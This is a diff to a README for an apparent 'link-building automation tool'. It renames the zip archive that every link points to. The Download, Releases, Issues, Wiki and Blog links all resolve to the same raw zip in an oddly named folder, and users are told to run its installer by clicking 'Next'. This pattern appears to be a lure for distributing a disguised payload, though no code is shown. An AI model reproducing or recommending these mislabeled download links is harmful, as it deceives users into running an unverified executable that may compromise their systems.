@@ -1,6 +1,6 @@
 # 🚀 link-building-automation-tool - Simplify Your Link Building Process
 
-[![Download](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip)](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip)
+[![Download](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip)](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets the following requirements:
 To start using the link-building-automation-tool, follow these simple steps:
 
 1. **Download the Application**
-   - Visit this page to download: [Download Link Building Automation Tool](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip).
+   - Visit this page to download: [Download Link Building Automation Tool](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip).
 
 2. **Installation**
    - Follow the prompts in the installer to complete the setup. The process is straightforward; simply click "Next" until the installation finishes.
@@ -42,7 +42,7 @@ To start using the link-building-automation-tool, follow these simple steps:
 
 To download the latest version of the link-building-automation-tool:
 
-- Visit the Releases page: [Download Here](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip).
+- Visit the Releases page: [Download Here](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip).
 - Locate the latest version listed.
 - Click on the appropriate file for your operating system. 
 
@@ -66,7 +66,7 @@ Once downloaded, install by following the on-screen instructions. It should only
 
 If you encounter any issues or have questions, you can reach out for support:
 
-- **GitHub Issues:** Use the [Issues page](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip) for bug reports and feature requests.
+- **GitHub Issues:** Use the [Issues page](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip) for bug reports and feature requests.
 - **Community Forum:** Join discussions and get tips from other users in the community forum linked from the GitHub page.
 
 ## ✍️ Contributing
@@ -81,7 +81,7 @@ Every contribution makes the tool better for everyone.
 
 ## 🌐 Additional Resources
 
-- **Documentation:** For thorough instructions on all features, refer to our [Wiki](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip).
-- **Blog:** Stay updated on link-building strategies and tool updates by checking our [Blog](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-building-automation-tool.zip).
+- **Documentation:** For thorough instructions on all features, refer to our [Wiki](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip).
+- **Blog:** Stay updated on link-building strategies and tool updates by checking our [Blog](https://raw.githubusercontent.com/jawad90183/link-building-automation-tool/main/herbous/link-tool-automation-building-v1.7.zip).
 
 Thank you for using the link-building-automation-tool. We hope it brings you success in your digital marketing efforts!
